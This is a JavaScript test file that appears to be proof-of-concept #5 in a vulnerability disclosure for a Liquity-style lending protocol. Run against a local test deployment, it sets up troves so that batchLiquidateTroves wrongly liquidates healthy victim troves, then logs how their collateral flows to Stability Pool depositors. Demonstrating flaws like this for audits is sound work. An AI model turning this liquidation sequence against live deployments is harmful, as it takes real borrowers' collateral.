const deploymentHelper = require("../utils/deploymentHelpers.js")
const testHelpers = require("../utils/testHelpers.js")
const th = testHelpers.TestHelper
const dec = th.dec, toBN = th.toBN
const ZERO_ADDRESS = th.ZERO_ADDRESS
const TroveManagerTester = artifacts.require("./TroveManagerTester")
const LUSDToken = artifacts.require("./LUSDToken.sol")

/*
  PoC #5 - The exploit does NOT require the attacker to be in the Stability Pool.
  A third-party SP depositor (erin) who never touched a trove receives the profit,
  and the value comes from the wrongly-liquidated victim's collateral.
  Also shows the attacker does not need to be the batch caller.
*/
contract("PoC5: profit accrues to third-party SP depositors", (accounts) => {
  const owner = accounts[0]
  const A = accounts.slice(1, 30)
  let contracts, priceFeed, stabilityPool, troveManager, borrowerOperations, collSurplusPool, defaultPool

  beforeEach(async () => {
    contracts = await deploymentHelper.deployLiquityCore()
    contracts.troveManager = await TroveManagerTester.new()
    contracts.lusdToken = await LUSDToken.new(
      contracts.troveManager.address, contracts.stabilityPool.address, contracts.borrowerOperations.address)
    const LQTYContracts = await deploymentHelper.deployLQTYContracts(owner, owner, owner)
    priceFeed = contracts.priceFeedTestnet
    stabilityPool = contracts.stabilityPool
    troveManager = contracts.troveManager
    borrowerOperations = contracts.borrowerOperations
    collSurplusPool = contracts.collSurplusPool
    defaultPool = contracts.defaultPool
    await deploymentHelper.connectLQTYContracts(LQTYContracts)
    await deploymentHelper.connectCoreContracts(contracts, LQTYContracts)
    await deploymentHelper.connectLQTYContractsToCore(LQTYContracts, contracts)
  })

  const openExact = async (coll, targetCompositeDebt, from) => {
    let m = targetCompositeDebt.sub(toBN(dec(200, 18)))
    for (let i = 0; i < 6; i++) {
      const fee = await contracts.troveManager.getBorrowingFee(m)
      m = targetCompositeDebt.sub(toBN(dec(200, 18))).sub(fee)
    }
    await borrowerOperations.openTrove(toBN(dec(100, 16)), m, ZERO_ADDRESS, ZERO_ADDRESS, { from, value: coll })
    const t = await troveManager.getEntireDebtAndColl(from)
    return { coll: t.coll, debt: t.debt }
  }

  it("a pure third-party SP depositor profits from the wrongly liquidated victim", async () => {
    await priceFeed.setPrice(dec(200, 18))
    const dennis = A[10], erin = A[11]
    // dennis: SP funder / liquidator, ICR 120% at P=140
    await openExact(toBN(dec(1286, 18)), toBN(dec(150000, 18)), dennis)
    // 6 triggers ICR 119% @140
    for (let i = 0; i < 6; i++) { await openExact(toBN(dec(85, 18)), toBN(dec(10000, 18)), A[i]) }
    // 4 victims ICR 121% @140  (ABOVE the real TCR)
    for (let i = 0; i < 4; i++) { await openExact(toBN(dec(86, 18)), toBN(dec(10000, 18)), A[6 + i]) }
    // erin: pure third-party SP depositor (no trove), gets 20% of dennis' LUSD
    await contracts.lusdToken.transfer(erin, toBN(dec(30000, 18)), { from: dennis })
    await stabilityPool.provideToSP(toBN(dec(30000, 18)), ZERO_ADDRESS, { from: erin })
    await stabilityPool.provideToSP((await contracts.lusdToken.balanceOf(dennis)).sub(toBN(dec(30000,18))), ZERO_ADDRESS, { from: dennis })

    await priceFeed.setPrice(dec(140, 18))
    const P = await priceFeed.getPrice()
    const realTCR = await th.getTCR(contracts)
    console.log("real TCR:", realTCR.toString(), "recovery:", (await th.checkRecoveryMode(contracts)).toString())
    console.log("victim ICR:", (await troveManager.getCurrentICR(A[6], P)).toString())
    console.log("trigger ICR:", (await troveManager.getCurrentICR(A[0], P)).toString())
    console.log("erin SP deposit:", (await stabilityPool.getCompoundedLUSDDeposit(erin)).toString())

    const erinBefore = await stabilityPool.getDepositorETHGain(erin)
    const denBefore  = await stabilityPool.getDepositorETHGain(dennis)

    // An unrelated third party (A[20]) calls the liquidation - not the attacker
    const batch = []
    for (let i = 0; i < 6; i++) batch.push(A[i])
    for (let i = 0; i < 4; i++) batch.push(A[6 + i])
    const tx = await troveManager.batchLiquidateTroves(batch, { from: A[20] })
    let n = 0
    for (const log of tx.logs) if (log.event === "TroveLiquidated") n++
    console.log("liquidations:", n)

    const erinAfter = await stabilityPool.getDepositorETHGain(erin)
    const denAfter  = await stabilityPool.getDepositorETHGain(dennis)
    console.log("erin  (pure third-party depositor) ETH gain:", erinAfter.sub(erinBefore).toString())
    console.log("dennis(attacker)                  ETH gain:", denAfter.sub(denBefore).toString())
    for (let i = 6; i < 10; i++) console.log("victim", A[i].slice(0,8), "status:", (await troveManager.getTroveStatus(A[i])).toString())
    console.log("victim collateral surplus (erin-independent):")
    for (let i = 6; i < 10; i++) console.log("  ", A[i].slice(0,8), (await collSurplusPool.getCollateral(A[i])).toString())
  })
})
